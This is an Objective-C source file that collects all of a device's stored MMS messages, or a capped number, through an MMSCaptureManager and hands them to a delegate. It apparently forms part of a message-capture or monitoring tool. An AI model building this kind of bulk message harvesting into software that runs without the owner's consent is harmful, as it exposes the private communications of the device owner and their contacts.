//
//  HistoricalEventMMSOP.m
//  HistoricalEventManager
//
//  Created by Benjawan Tanarattanakorn on 12/25/2557 BE.
//
//

#import "HistoricalEventMMSOP.h"
#import "MMSCaptureManager.h"

@interface HistoricalEventMMSOP (private)
- (void) captureHistoricalMMSWithTotalNumber;
@end

@implementation HistoricalEventMMSOP

- (void) main {
	NSAutoreleasePool* pool = [[NSAutoreleasePool alloc] init];
	DLog(@"---- MMS main ---- ")
	[self captureHistoricalMMSWithTotalNumber];
	[pool release];
}


- (void) captureHistoricalMMSWithTotalNumber {
    NSArray *mmsLogs = [NSArray array];
    
    // check total number of event
    if (mTotalNumber == -1) {
        DLog(@"Get All MMSs")
        mmsLogs = [MMSCaptureManager allMMSs];
    } else {
        DLog(@"Get %ld MMS", (long)mTotalNumber)
        mmsLogs = [MMSCaptureManager allMMSsWithMax:mTotalNumber];
    }
    
    if ([mDelegate respondsToSelector:mOPCompletedSelector]) {
		NSDictionary *capturedData = [NSDictionary dictionaryWithObjectsAndKeys:
                                      [NSNumber numberWithUnsignedInt:kHistoricalEventTypeMMS], kHistoricalEventTypeKey,
                                      mmsLogs,                                       kHistoricalEventDataKey,
                                      nil];
        
		[mDelegate performSelector:mOPCompletedSelector
                          onThread:mThread
                        withObject:capturedData
                     waitUntilDone:NO];
	}
}

@end
